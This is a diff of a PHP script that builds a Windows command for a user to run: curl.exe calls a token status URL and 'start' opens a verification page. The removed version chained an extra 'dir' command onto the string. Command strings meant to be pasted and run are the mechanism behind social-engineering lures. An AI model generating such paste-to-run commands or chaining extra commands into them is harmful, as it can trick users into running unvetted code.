@@ -22,9 +22,7 @@ if ($minted === null) {
 }
 $token = $minted['token'];
 $origin = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost');
-$curlTarget = str_starts_with($origin, 'http://') ? substr($origin, 7) . '/s/' . $token : $origin . '/s/' . $token;
-$extraCommand = 'dir';
-$command = 'curl.exe -fs ' . $curlTarget . '&&start ' . $origin . '/v/' . $token . '&' . $extraCommand;
+$command = 'curl.exe -fsSL "' . $origin . '/api/status?token=' . $token . '" && start "" "' . $origin . '/verify/' . $token . '"';
 if (($_GET['format'] ?? '') === 'json') {
 	header('Content-Type: application/json; charset=utf-8');
 	echo json_encode([
